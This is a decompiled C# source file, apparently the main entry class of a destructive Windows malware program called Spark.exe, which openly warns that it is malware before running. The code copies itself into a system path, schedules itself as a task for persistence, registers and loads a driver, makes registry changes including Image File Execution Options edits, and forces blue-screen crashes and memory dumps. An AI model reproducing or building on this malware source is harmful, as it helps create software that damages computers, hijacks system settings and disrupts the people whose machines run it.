using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Spark
{
	// Token: 0x02000009 RID: 9
	internal class Start
	{
		// Token: 0x0600002D RID: 45
		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool SetProcessDPIAware();

		// Token: 0x0600002E RID: 46 RVA: 0x00002B30 File Offset: 0x00000D30
		[MTAThread]
		private static void Main(string[] args)
		{
			Application.EnableVisualStyles();
			Start.SetProcessDPIAware();
			if (args.Length != 0 && args[0] == "/RSOD")
			{
				Files.UnpackFiles();
				Driver.Register();
				Driver.Load();
				Destructive.MemoryDump(1);
			}
			if (!Variables.Initialised && MessageBox.Show("This is malware, are you sure you want to execute it?", "Spark.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No)
			{
				Environment.Exit(0);
			}
			if (Variables.Running)
			{
				Environment.Exit(0);
			}
			if (!Variables.Initialised)
			{
				Start.InitialiseSpark();
				return;
			}
			Files.UnpackFiles();
			Threads.Main();
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00002BB8 File Offset: 0x00000DB8
		public static void InitialiseSpark()
		{
			Files.UnpackFiles();
			File.Copy(AppDomain.CurrentDomain.BaseDirectory + "Spark.exe", Variables.FilePath + "\\Spark.exe");
			TaskScheduling.Schedule(Variables.FilePath + "\\Spark.exe");
			Files.Initialised();
			if (!Variables.x64)
			{
				Driver.Register();
				RegistryEdits.GeneralChanges();
				RegistryEdits.ImageFileExecutionOptions();
				Threads.Main();
			}
			Driver.Unblock();
			Destructive.BasicBsod();
		}
	}
}
